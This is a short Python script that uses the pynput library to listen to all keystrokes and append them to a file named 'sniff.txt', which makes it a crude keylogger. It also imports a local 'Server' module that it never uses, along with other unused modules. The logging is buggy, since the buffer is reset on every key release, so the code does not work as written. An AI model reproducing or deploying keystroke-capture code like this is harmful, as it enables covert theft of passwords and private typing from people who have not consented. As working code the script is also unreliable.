from pkg_resources import working_set
from pynput.keyboard import Listener , Key
from pytz import common_timezones_set
from Server import server
f = open('sniff.txt','a')
log = ""

def on_press(key):
    print("{0} pressed".format(key))


def on_release(key):
    log=''
    if key == Key.enter:
        f.writelines(log+'\n')
        log=''
    elif key == Key.esc:
        f.close() 
        exit()
    else:
        log+= str(key) + ' '

with Listener(on_press=on_press , on_release=on_release) as listener:
    listener.join()
